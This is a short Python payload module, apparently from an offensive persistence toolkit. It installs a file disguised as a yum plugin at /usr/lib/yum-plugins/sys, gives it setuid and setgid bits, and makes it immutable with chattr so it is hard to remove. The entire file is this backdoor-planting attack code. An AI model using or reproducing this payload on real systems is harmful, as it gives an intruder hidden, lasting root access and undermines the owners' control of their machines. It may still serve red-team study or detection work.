#!/usr/bin/python3

from ..base import Payload

class Suid(Payload):

    files = {'suid': '/usr/lib/yum-plugins/sys'}

    def __init__(self):
        self.commands = []
        self.commands.append("chattr -i /usr/lib/yum-plugins/sys")
        self.commands.append("chmod 555 /usr/lib/yum-plugins/sys")
        self.commands.append("chmod ugo+s /usr/lib/yum-plugins/sys")
        self.commands.append("chmod ugo+g /usr/lib/yum-plugins/sys")
        self.commands.append("chattr +i /usr/lib/yum-plugins/sys")

    def steps(self):
        return self.commands


